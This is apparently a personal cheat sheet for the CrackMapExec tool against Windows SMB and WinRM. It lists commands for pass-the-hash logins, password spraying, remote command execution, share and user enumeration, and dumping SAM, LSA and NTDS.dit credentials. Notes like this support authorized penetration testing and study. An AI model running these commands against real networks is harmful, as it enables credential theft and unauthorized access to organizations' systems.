# Usage
```bash

crackmapexec smb <IP/CIDR or range> -u <user> -H <hash> --local-auth 

#passpassword
crackmapexec smb <IP/CIDR or range> -u <user> -d <domain> -p <pass> 

# flags
smb # for smb
winrm # for winrm
-u # USER or user.txt
-p # PASSWORD or password.txt
-d # domain
-H # Hash
--no-bruteforce # 1st user with 1st password, 2nd user with 2nd password etc.
--continue-on-success # try all 
---
# Executions
-x # Execute a command 
--local # local account
--local-auth # login



# gather creds
--sam # dump sam hahses
--lsa # dump lsa secrets
--ntds # dump NTDS.dit
```
# SMB
```bash
# smb shares
crackmapexec smb 192.168.200.128 -u '' -p '' --shares
crackmapexec smb [target IP] -u usernames.txt -p '' # Enum usernames
-M # module
spider_plus # run spider_plus module enumurate shares for user run it with one user not files 

# password spray
crackmapexec smb 192.168.200.128 -d cs.org -u users.txt -p 'Changeme123!' 



# Examples
cme smb 10.10.10.10 -u edger -p password -M spider_plus
	crackmapexec smb 192.168.200.128 -u 'administrador' -p 'cs2022!' -d cs.org
cat /tmp/FILE | jq .
cat /tmp/FILE | jq '. | keys' # filter keys shows open shares etc. 
cat /tmp/FILE | jq '. | map_values(keys)' 
```

## dump all
```
cme smb 10.10.10.1 -u 'john' -p 'password123' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```


---
Tags: #passhash #smb #AD #hashdump #impackets #crackmapexec
Resources: [Impacket](https://github.com/fortra/impacket)Resources: